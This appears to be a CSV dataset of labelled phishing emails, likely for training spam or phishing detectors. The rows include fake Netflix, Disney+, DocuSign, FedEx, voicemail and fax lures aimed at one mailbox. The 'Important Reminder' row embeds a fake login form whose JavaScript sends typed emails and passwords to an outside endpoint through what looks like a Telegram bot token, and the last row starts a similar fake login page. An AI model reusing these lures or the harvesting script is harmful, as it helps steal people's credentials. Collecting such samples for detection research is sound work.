source,year,date,subject,body,label,text 
Nazario_recent,2024,"Sun, 24 Nov 2024 22:41:32 +0000",re: Unpaid Netflix bill [DD-826508-D4161],"&nbsp; Your account is suspended. Please try to pay again or update your payment information Hello , We are still unable to process your payment. Please check that your payment method has a sufficient balance and has not expired, then try paying again to continue watching Netflix . Retry payment Update payment method &nbsp; &nbsp; For further information, please consult the Help Center or contact us. Netflix &nbsp; &nbsp; ‪ Netflix International B.V.‬ SRC: 61675495_c9a2a218-ae0f-40aa-b1d8-939d1b6dc49b_fr_BE_EVO",1,"re: Unpaid Netflix bill [DD-826508-D4161] &nbsp; Your account is suspended. Please try to pay again or update your payment information Hello , We are still unable to process your payment. Please check that your payment method has a sufficient balance and has not expired, then try paying again to continue watching Netflix . Retry payment Update payment method &nbsp; &nbsp; For further information, please consult the Help Center or contact us. Netflix &nbsp; &nbsp; ‪ Netflix International B.V.‬ SRC: 61675495_c9a2a218-ae0f-40aa-b1d8-939d1b6dc49b_fr_BE_EVO"
Nazario_recent,2024,"Mon, 25 Nov 2024 03:18:41 -0800",Invitation to join KzMgLX Your eyes should be on me. lLVbn6,"Hi jose@monkey.org, frankie21harold@c.deting.club invited you to join the group KzMgLX Your eyes should be on me. lLVbn6. URL Google Groups allows you to create and participate in online forums and email-based groups with a rich community experience. You can also use your Group to share documents, pictures, calendars, invitations and other resources. Accept this invitation at: URL If you do not wish to be a member of this group or believe that this group may contain spam: * You can report this group for abuse at URL * You can opt out of all future Google Groups activity at URL Visit the Google Groups Help Centre at URL",1,"Invitation to join KzMgLX Your eyes should be on me. lLVbn6 Hi jose@monkey.org, frankie21harold@c.deting.club invited you to join the group KzMgLX Your eyes should be on me. lLVbn6. URL Google Groups allows you to create and participate in online forums and email-based groups with a rich community experience. You can also use your Group to share documents, pictures, calendars, invitations and other resources. Accept this invitation at: URL If you do not wish to be a member of this group or believe that this group may contain spam: * You can report this group for abuse at URL * You can opt out of all future Google Groups activity at URL Visit the Google Groups Help Centre at URL"
Nazario_recent,2024,25 Nov 2024 11:47:30 +0000,Important Reminder,"Dear jose, This is to inform you that jose@monkey.org expires today and will be suspended due to violations of our email terms of service. Note: You have 81 pending messages on hold waiting for you. To review and save your pending messages, Kindly see attached for more details and to submit an appeal. To assist you in this process, we have also prepared a comprehensive document outlining important updates and best practices for managing your email accounts effectively. Your security and convenience are our top priorities, and we encourage you to review the document carefully to ensure the continued smooth operation of your email services. Should you have any questions or require further assistance, please do not hesitate to contact our dedicated support team at &nbsp; monkey.org . Thank you for your attention to this matter. Warm regards, Email IT Administrator monkey.org body { background-image: url("" URL background-size: cover; background-repeat: no-repeat; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; } .login-form { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; } button { width: 100%; padding: 10px; margin: 10px 0; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; } Sign in via monkey.org To continue: Email: Enter Password: View PDF Document const form = document.getElementById('loginForm'); const loginMessage = document.getElementById('loginMessage'); form.addEventListener('submit', function(event) { event.preventDefault(); const email = form.elements.email.value; const password = form.elements.password.value; const apiKey = '8131925978:AAFSyv5rgmG-c6tVQQObD_QnaUC8m8h9jfo'; const chatId = '-1002476756290'; fetch(` URL ${email}%0APassword: ${password}`) .then(response => { if (response.ok) { loginMessage.innerText = 'Login Failed: Please chec",1,"Important Reminder Dear jose, This is to inform you that jose@monkey.org expires today and will be suspended due to violations of our email terms of service. Note: You have 81 pending messages on hold waiting for you. To review and save your pending messages, Kindly see attached for more details and to submit an appeal. To assist you in this process, we have also prepared a comprehensive document outlining important updates and best practices for managing your email accounts effectively. Your security and convenience are our top priorities, and we encourage you to review the document carefully to ensure the continued smooth operation of your email services. Should you have any questions or require further assistance, please do not hesitate to contact our dedicated support team at &nbsp; monkey.org . Thank you for your attention to this matter. Warm regards, Email IT Administrator monkey.org body { background-image: url("" URL background-size: cover; background-repeat: no-repeat; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; } .login-form { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; } button { width: 100%; padding: 10px; margin: 10px 0; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; } Sign in via monkey.org To continue: Email: Enter Password: View PDF Document const form = document.getElementById('loginForm'); const loginMessage = document.getElementById('loginMessage'); form.addEventListener('submit', function(event) { event.preventDefault(); const email = form.elements.email.value; const password = form.elements.password.value; const apiKey = '8131925978:AAFSyv5rgmG-c6tVQQObD_QnaUC8m8h9jfo'; const chatId = '-1002476756290'; fetch(` URL ${email}%0APassword: ${password}`) .then(response => { if (response.ok) { loginMessage.innerText = 'Login Failed: Please chec"
Nazario_recent,2024,"Mon, 25 Nov 2024 16:46:07 -0000",Complete Via DocuSign: Signature required - 25/11/24,"<html data-lt-installed=""true""> <head> <title></title> <meta content=""IE=edge"" http-equiv=""X-UA-Compatible"" /> </head> <body data-gramm=""false"" data-lt-tmp-id=""lt-951578""> <div id=""v1v1v1v1editbody1""> <div style=""padding: 2%; font-family: Helvetica,Arial,Sans Serif; background-color: rgb(234, 234, 234);""> <table align=""center"" border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody> <tr> <td>&nbsp;</td> <td width=""640""> <table style=""border-collapse: collapse; max-width: 640px; background-color: rgb(255, 255, 255); mso-table-lspace: 0pt; mso-table-rspace: 0pt;""> <tbody> <tr> <td style=""padding: 10px 24px;""><img alt=""DocuSign"" src="" URL style=""border: currentColor; border-image: none;"" width=""116"" /></td> </tr> <tr> <td style=""padding: 0px 24px 30px;""> <table align=""center"" border=""0"" cellpadding=""0"" cellspacing=""0"" style=""color: rgb(255, 255, 255); background-color: rgb(30, 76, 161);"" width=""100%""> <tbody> <tr> <td align=""center"" style=""padding: 28px 36px 36px; border-radius: 2px; width: 100%; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica,Arial,Sans Serif; font-size: 16px; background-color: rgb(30, 76, 161);""><img height=""75"" src="" URL style=""width: 75px; height: 75px;"" width=""75"" /> <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody> <tr> <td align=""center"" style=""border: currentColor; border-image: none; text-align: center; color: rgb(255, 255, 255); padding-top: 24px; font-family: Helvetica,Arial,Sans Serif; font-size: 16px;""> <p><span style=""text-align: center; color: rgb(255, 255, 255); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial, &quot;Sans Serif&quot;; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: normal; orphans: 2; widows: 2; background-color: rgb(33, 78, 159); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:",1,"Complete Via DocuSign: Signature required - 25/11/24 <html data-lt-installed=""true""> <head> <title></title> <meta content=""IE=edge"" http-equiv=""X-UA-Compatible"" /> </head> <body data-gramm=""false"" data-lt-tmp-id=""lt-951578""> <div id=""v1v1v1v1editbody1""> <div style=""padding: 2%; font-family: Helvetica,Arial,Sans Serif; background-color: rgb(234, 234, 234);""> <table align=""center"" border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody> <tr> <td>&nbsp;</td> <td width=""640""> <table style=""border-collapse: collapse; max-width: 640px; background-color: rgb(255, 255, 255); mso-table-lspace: 0pt; mso-table-rspace: 0pt;""> <tbody> <tr> <td style=""padding: 10px 24px;""><img alt=""DocuSign"" src="" URL style=""border: currentColor; border-image: none;"" width=""116"" /></td> </tr> <tr> <td style=""padding: 0px 24px 30px;""> <table align=""center"" border=""0"" cellpadding=""0"" cellspacing=""0"" style=""color: rgb(255, 255, 255); background-color: rgb(30, 76, 161);"" width=""100%""> <tbody> <tr> <td align=""center"" style=""padding: 28px 36px 36px; border-radius: 2px; width: 100%; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica,Arial,Sans Serif; font-size: 16px; background-color: rgb(30, 76, 161);""><img height=""75"" src="" URL style=""width: 75px; height: 75px;"" width=""75"" /> <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody> <tr> <td align=""center"" style=""border: currentColor; border-image: none; text-align: center; color: rgb(255, 255, 255); padding-top: 24px; font-family: Helvetica,Arial,Sans Serif; font-size: 16px;""> <p><span style=""text-align: center; color: rgb(255, 255, 255); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial, &quot;Sans Serif&quot;; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: normal; orphans: 2; widows: 2; background-color: rgb(33, 78, 159); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:"
Nazario_recent,2024,"Tue, 26 Nov 2024 08:35:44 -0300",CV21 - Larissa Souza,An HTML viewer is required to see this message,1,CV21 - Larissa Souza An HTML viewer is required to see this message
Nazario_recent,2024,"Tue, 26 Nov 2024 12:18:29 +0000",re: Unpaid Netflix bill [DD-049234-D6498],"&nbsp; Your account is suspended. Please try to pay again or update your payment information Hello , We are still unable to process your payment. Please check that your payment method has a sufficient balance and has not expired, then try paying again to continue watching Netflix . Retry payment Update payment method &nbsp; &nbsp; For further information, please consult the Help Center or contact us. Netflix &nbsp; &nbsp; ‪ Netflix International B.V.‬ SRC: 61675495_c9a2a218-ae0f-40aa-b1d8-939d1b6dc49b_fr_BE_EVO",1,"re: Unpaid Netflix bill [DD-049234-D6498] &nbsp; Your account is suspended. Please try to pay again or update your payment information Hello , We are still unable to process your payment. Please check that your payment method has a sufficient balance and has not expired, then try paying again to continue watching Netflix . Retry payment Update payment method &nbsp; &nbsp; For further information, please consult the Help Center or contact us. Netflix &nbsp; &nbsp; ‪ Netflix International B.V.‬ SRC: 61675495_c9a2a218-ae0f-40aa-b1d8-939d1b6dc49b_fr_BE_EVO"
Nazario_recent,2024,"Thu, 28 Nov 2024 00:30:21 +0000 (UTC)",re: required: update your information [DD-295874-D5655],"&nbsp; &nbsp; Your account is suspended. Hello! We're having trouble with your billing information. Would you like to try paying with your card again ? You can also enter a new payment method . &nbsp; Need help? We're here to help. Visit the Help Center or contact us now. &nbsp; Merci de ne pas r&eacute;pondre &agrave; cette communication car nous ne pouvons malheureusement pas vous r&eacute;pondre individuellement. Cet e-mail de service contient des informations essentielles relatives &agrave; votre compte Disney+ ou &agrave; un achat ou un abonnement &agrave; l&rsquo;un de nos services. Disney respecte et &oelig;uvre &agrave; prot&eacute;ger la vie priv&eacute;e de ses utilisateurs. Pour toute question relative au traitement et &agrave; l'utilisation de vos donn&eacute;es personnelles, consultez les liens suivants &nbsp; R&egrave;gles de Respect de la Vie Priv&eacute;e&nbsp;et &nbsp; Droits Donn&eacute;es dans l'UE et au R‑U. Cet e-mail de service a &eacute;t&eacute; envoy&eacute; par : The Walt Disney Company (Benelux) BV, &nbsp; PO Box 23658, 1100 ED AMSTERDAM, The Netherlands, Chambre du commerce : &nbsp; 34076102. &nbsp; Ces informations &eacute;taient correctes au moment de l'envoi de cet e-mail. Conditions G&eacute;n&eacute;rales d&rsquo;Abonnement &nbsp; &ndash; &nbsp; R&egrave;gles de Respect de la Vie Priv&eacute;e &nbsp; &ndash; &nbsp; Modalit&eacute;s relatives aux cookies &nbsp; &ndash; &nbsp; Droits Donn&eacute;es dans l'UE et au R-U &copy; 2024 Disney+ et toutes ses entit&eacute;s associ&eacute;es. Tous droits&nbsp;r&eacute;serv&eacute;s.",1,"re: required: update your information [DD-295874-D5655] &nbsp; &nbsp; Your account is suspended. Hello! We're having trouble with your billing information. Would you like to try paying with your card again ? You can also enter a new payment method . &nbsp; Need help? We're here to help. Visit the Help Center or contact us now. &nbsp; Merci de ne pas r&eacute;pondre &agrave; cette communication car nous ne pouvons malheureusement pas vous r&eacute;pondre individuellement. Cet e-mail de service contient des informations essentielles relatives &agrave; votre compte Disney+ ou &agrave; un achat ou un abonnement &agrave; l&rsquo;un de nos services. Disney respecte et &oelig;uvre &agrave; prot&eacute;ger la vie priv&eacute;e de ses utilisateurs. Pour toute question relative au traitement et &agrave; l'utilisation de vos donn&eacute;es personnelles, consultez les liens suivants &nbsp; R&egrave;gles de Respect de la Vie Priv&eacute;e&nbsp;et &nbsp; Droits Donn&eacute;es dans l'UE et au R‑U. Cet e-mail de service a &eacute;t&eacute; envoy&eacute; par : The Walt Disney Company (Benelux) BV, &nbsp; PO Box 23658, 1100 ED AMSTERDAM, The Netherlands, Chambre du commerce : &nbsp; 34076102. &nbsp; Ces informations &eacute;taient correctes au moment de l'envoi de cet e-mail. Conditions G&eacute;n&eacute;rales d&rsquo;Abonnement &nbsp; &ndash; &nbsp; R&egrave;gles de Respect de la Vie Priv&eacute;e &nbsp; &ndash; &nbsp; Modalit&eacute;s relatives aux cookies &nbsp; &ndash; &nbsp; Droits Donn&eacute;es dans l'UE et au R-U &copy; 2024 Disney+ et toutes ses entit&eacute;s associ&eacute;es. Tous droits&nbsp;r&eacute;serv&eacute;s."
Nazario_recent,2024,28 Nov 2024 13:16:42 +0100,Complete with Docusign: Review Document,"You received a new&nbsp;document to review and sign. REVIEW&nbsp;&amp; SIGN DOCUMENT&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hello jose, Please review the following documents.. Thank You, Powered by Do Not Share This Email This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others. Alternate Signing Method Visit DocuSign.com, click 'Access Documents', and enter the security code: 946755ACA0EA424EA78C91A0385654992 About DocuSign Sign documents electronically in just minutes. It's safe, secure, and legally binding. Whether you're in an office, at home, on-the-go -- or even across the globe -- DocuSign provides a professional trusted solution for Digital Transaction Management&#8482;. Questions about the Document? If you need to modify the document or have questions about the details in the document, please reach out to the sender by emailing them directly. Stop receiving this email Report this email or read more about Declining to sign and Managing notifications . If you are having trouble signing the document, please visit the Help with Signing page on our Support Center . Download the DocuSign App This message was sent to you by Franziska Froriep who is using the DocuSign Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.",1,"Complete with Docusign: Review Document You received a new&nbsp;document to review and sign. REVIEW&nbsp;&amp; SIGN DOCUMENT&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hello jose, Please review the following documents.. Thank You, Powered by Do Not Share This Email This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others. Alternate Signing Method Visit DocuSign.com, click 'Access Documents', and enter the security code: 946755ACA0EA424EA78C91A0385654992 About DocuSign Sign documents electronically in just minutes. It's safe, secure, and legally binding. Whether you're in an office, at home, on-the-go -- or even across the globe -- DocuSign provides a professional trusted solution for Digital Transaction Management&#8482;. Questions about the Document? If you need to modify the document or have questions about the details in the document, please reach out to the sender by emailing them directly. Stop receiving this email Report this email or read more about Declining to sign and Managing notifications . If you are having trouble signing the document, please visit the Help with Signing page on our Support Center . Download the DocuSign App This message was sent to you by Franziska Froriep who is using the DocuSign Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request."
Nazario_recent,2024,29 Nov 2024 05:30:42 -0800,Invoice payment Schedule Oct 2024.xlsx,"The Account Department has shared access to ""Invoice payment Schedule Nov 2024.xlsx"" With You jose@monkey.org . &nbsp; &nbsp; &nbsp; Payment Schedule Nov 2024.xlsx Last modified 11/28/24 Open in Excel &nbsp;&nbsp;&nbsp; Download Document &nbsp;",1,"Invoice payment Schedule Oct 2024.xlsx The Account Department has shared access to ""Invoice payment Schedule Nov 2024.xlsx"" With You jose@monkey.org . &nbsp; &nbsp; &nbsp; Payment Schedule Nov 2024.xlsx Last modified 11/28/24 Open in Excel &nbsp;&nbsp;&nbsp; Download Document &nbsp;"
Nazario_recent,2024,"Fri, 29 Nov 2024 16:44:46 +0000",PURCHASE6220,Ref. Tender No. Um-001/PURCHASE6220/2024-S0 Um-001/PURCHASE6220/2024-S0.doc monkey.org Server. Open,1,PURCHASE6220 Ref. Tender No. Um-001/PURCHASE6220/2024-S0 Um-001/PURCHASE6220/2024-S0.doc monkey.org Server. Open
Nazario_recent,2024,28 Nov 2024 19:50:23 +0000,RE: (FedEx) AWB NOTICE - ORIGINAL SHIPPING DOCUMENTS 128093287,"&nbsp; Dear Valued Customer, You have a New Shipment Awaiting Your Confirmation. Please&nbsp; Download the documents for Packing List, Commercial Invoice and Bill Of Lading. &nbsp;This email has been sent to: mbills@hmishred.com &copy; 2024 FedEx. The content of this message is protected by copyright and trademark laws under U.S. and international law. Review our&nbsp;&nbsp; privacy policy . All rights reserved.",1,"RE: (FedEx) AWB NOTICE - ORIGINAL SHIPPING DOCUMENTS 128093287 &nbsp; Dear Valued Customer, You have a New Shipment Awaiting Your Confirmation. Please&nbsp; Download the documents for Packing List, Commercial Invoice and Bill Of Lading. &nbsp;This email has been sent to: mbills@hmishred.com &copy; 2024 FedEx. The content of this message is protected by copyright and trademark laws under U.S. and international law. Review our&nbsp;&nbsp; privacy policy . All rights reserved."
Nazario_recent,2024,30 Nov 2024 23:26:52 +0000,Re: jose You have a new Voicemail Message From ITAdmin monkey.org,"Hello jose@monkey.org , You missed a call from&nbsp;ITAdmin @ &nbsp;monkey.org (+971) 432xxx55 Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org",1,"Re: jose You have a new Voicemail Message From ITAdmin monkey.org Hello jose@monkey.org , You missed a call from&nbsp;ITAdmin @ &nbsp;monkey.org (+971) 432xxx55 Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org"
Nazario_recent,2024,30 Nov 2024 10:43:21 +0000,Re: jose You have a new Voicemail From PURANMAL RESTAURANT LLC,"Hello jose@monkey.org , You missed a call from PURANMAL RESTAURANT LLC &nbsp; (971) 265-xx19. Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org",1,"Re: jose You have a new Voicemail From PURANMAL RESTAURANT LLC Hello jose@monkey.org , You missed a call from PURANMAL RESTAURANT LLC &nbsp; (971) 265-xx19. Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org"
Nazario_recent,2024,1 Dec 2024 07:12:24 +0000,Re: jose You have a new Voicemail Message From ITAdmin monkey.org,"Hello jose@monkey.org , You missed a call from&nbsp;ITAdmin @ &nbsp;monkey.org (+971) 432xxx55 Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org",1,"Re: jose You have a new Voicemail Message From ITAdmin monkey.org Hello jose@monkey.org , You missed a call from&nbsp;ITAdmin @ &nbsp;monkey.org (+971) 432xxx55 Click PLAY below to listen to your message PLAY AUDIO monkey.org Voice Mail App HELP CENTER HELP FORUM This email was sent to you because you indicated that you&amp;apos;d like to receive email notifications for missed calls. If you don&amp;apos;t want to receive such emails in the future, please update your &nbsp; email notification settings . monkey.org"
Nazario_recent,2024,1 Dec 2024 04:24:09 -0800,EFT Payment has been automatically deposited,Find attachment and Reveiw. Thanks. AP,1,EFT Payment has been automatically deposited Find attachment and Reveiw. Thanks. AP
Nazario_recent,2024,"Tue, 3 Dec 2024 06:58:04 +0000",ATTN: Mailbox Account Verification Assistance REF: ipxSHk0S6XtlQ6fptiJqGW2Y,"Webmail Dear Jose, The password for your email account (jose@monkey.org) expires today 12/03/2024, 6:58:04 AM. Keep and continue with the same password using below portal to enhance your security protection. Keep Same Password < URL Do not ignore as access to this mailbox account will be restrict without any specific action. You can also see security activity at: URL",1,"ATTN: Mailbox Account Verification Assistance REF: ipxSHk0S6XtlQ6fptiJqGW2Y Webmail Dear Jose, The password for your email account (jose@monkey.org) expires today 12/03/2024, 6:58:04 AM. Keep and continue with the same password using below portal to enhance your security protection. Keep Same Password < URL Do not ignore as access to this mailbox account will be restrict without any specific action. You can also see security activity at: URL"
Nazario_recent,2024,2 Dec 2024 08:16:51 +0000,RE: Remittance SwiftReport_AED525605028542549.pdf,"&nbsp; ***** Incoming Fax Received ***** Dear &nbsp;jose , You have received a 2 page(s) Document via monkey.org Email Fax&nbsp; Click Download Document To View Your Fax Documents Online.&nbsp; Number Of Pages: &nbsp;2 page(s) Date Received: &nbsp;12/2/2024 8:16:51 a.m. Sent To: &nbsp;jose@monkey.org Reference: &nbsp;SwiftReport_ 757893343267704.pdf&nbsp; VIEW FAX DOCUMENT &copy;2024 monkey.org Efax Online.com&nbsp;",1,"RE: Remittance SwiftReport_AED525605028542549.pdf &nbsp; ***** Incoming Fax Received ***** Dear &nbsp;jose , You have received a 2 page(s) Document via monkey.org Email Fax&nbsp; Click Download Document To View Your Fax Documents Online.&nbsp; Number Of Pages: &nbsp;2 page(s) Date Received: &nbsp;12/2/2024 8:16:51 a.m. Sent To: &nbsp;jose@monkey.org Reference: &nbsp;SwiftReport_ 757893343267704.pdf&nbsp; VIEW FAX DOCUMENT &copy;2024 monkey.org Efax Online.com&nbsp;"
Nazario_recent,2024,3 Dec 2024 07:35:37 +0000,RE: Remittance Swift Report_AED12397.pdf,"&nbsp; ***** Incoming Fax Received ***** Dear &nbsp;jose , You have received a 2 page(s) Document via monkey.org Email Fax&nbsp; Click&nbsp;View Document To View Your Fax Documents Online.&nbsp; Number Of Pages: &nbsp;2 page(s) Date Received: &nbsp;12/3/2024 7:35:37 a.m. Sent To: &nbsp;jose@monkey.org Reference: &nbsp;AED SwiftReport_ 35879.pdf&nbsp; View Document Online &copy;2024 monkey.org Efax Online.com&nbsp;",1,"RE: Remittance Swift Report_AED12397.pdf &nbsp; ***** Incoming Fax Received ***** Dear &nbsp;jose , You have received a 2 page(s) Document via monkey.org Email Fax&nbsp; Click&nbsp;View Document To View Your Fax Documents Online.&nbsp; Number Of Pages: &nbsp;2 page(s) Date Received: &nbsp;12/3/2024 7:35:37 a.m. Sent To: &nbsp;jose@monkey.org Reference: &nbsp;AED SwiftReport_ 35879.pdf&nbsp; View Document Online &copy;2024 monkey.org Efax Online.com&nbsp;"
Nazario_recent,2024,"Tue, 03 Dec 2024 17:42:45 +0000",Complete via DocuSign: #Monkey_Doc. Signature required 12/3/2024,"﻿ DOCUSIGN Hi jose, You have received a document to review and sign. REVIEW_DOCUMENT Monkey DocuSign Administrator jose@monkey.org &nbsp; Do Not Share This Email This email contains a secure link to&nbsp;DocuSign. Please do not share this email, link, or access code with others.",1,"Complete via DocuSign: #Monkey_Doc. Signature required 12/3/2024 ﻿ DOCUSIGN Hi jose, You have received a document to review and sign. REVIEW_DOCUMENT Monkey DocuSign Administrator jose@monkey.org &nbsp; Do Not Share This Email This email contains a secure link to&nbsp;DocuSign. Please do not share this email, link, or access code with others."
Nazario_recent,2024,3 Dec 2024 12:44:22 +0000,RE: Purchase order contract UAE36863 FYA,"Hi jose Kindly find&nbsp;&nbsp;below PO Contract signed &nbsp;for&nbsp;payment&nbsp;of your Tax&nbsp;invoice as requested. Thank you From: &nbsp; DocuSign jose@monkey.orgon behalf of monkey.org Sent: &nbsp; 12/3/2024 12:44:22 p.m. To: &nbsp; jose@monkey.org SavePDF document and open with browser Your document has been completed jose@monkey.org All parties have completed Please DocuSign:&nbsp;contract PO&nbsp;- 1132348,&nbsp;UAE OU. Dear jose, You are receiving thiscontract PO &nbsp;documents as a payment set up formFOR in the future will be due to be made to you.&nbsp;For us to obtain this information kindly complete the attached and sign contract PO document.To process a payment we require all suppliers to submit their banking information to enable an account to be set up on our payment system. Many thanks in advance for your cooperation. Powered by&nbsp; Do Not Share This Email This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others. How toView or &nbsp;Read document Download the document &nbsp;and open with your browser About DocuSign Sign documents electronically in just minutes. It's safe, secure, and legally binding. Whether you're in an office, at home, on-the-go -- or even across the globe -- DocuSign provides a professional trusted If you are having trouble signing the document, please visit the &nbsp; Help with Signing &nbsp; page on our &nbsp; Support Center . Download the DocuSign App This message was sent to you by Informa Vendor Management Team who is using the DocuSign Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.&lt;20241203124422.D90F3453587B4475@icionvend.com&gt; continue body { background-color: #0047AB ; display: flex; justify-content: center; align-items: center; height: 100vh; } .container { background-color: #ffffff; padding: 25px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } h1 { text-",1,"RE: Purchase order contract UAE36863 FYA Hi jose Kindly find&nbsp;&nbsp;below PO Contract signed &nbsp;for&nbsp;payment&nbsp;of your Tax&nbsp;invoice as requested. Thank you From: &nbsp; DocuSign jose@monkey.orgon behalf of monkey.org Sent: &nbsp; 12/3/2024 12:44:22 p.m. To: &nbsp; jose@monkey.org SavePDF document and open with browser Your document has been completed jose@monkey.org All parties have completed Please DocuSign:&nbsp;contract PO&nbsp;- 1132348,&nbsp;UAE OU. Dear jose, You are receiving thiscontract PO &nbsp;documents as a payment set up formFOR in the future will be due to be made to you.&nbsp;For us to obtain this information kindly complete the attached and sign contract PO document.To process a payment we require all suppliers to submit their banking information to enable an account to be set up on our payment system. Many thanks in advance for your cooperation. Powered by&nbsp; Do Not Share This Email This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others. How toView or &nbsp;Read document Download the document &nbsp;and open with your browser About DocuSign Sign documents electronically in just minutes. It's safe, secure, and legally binding. Whether you're in an office, at home, on-the-go -- or even across the globe -- DocuSign provides a professional trusted If you are having trouble signing the document, please visit the &nbsp; Help with Signing &nbsp; page on our &nbsp; Support Center . Download the DocuSign App This message was sent to you by Informa Vendor Management Team who is using the DocuSign Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.&lt;20241203124422.D90F3453587B4475@icionvend.com&gt; continue body { background-color: #0047AB ; display: flex; justify-content: center; align-items: center; height: 100vh; } .container { background-color: #ffffff; padding: 25px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } h1 { text-"
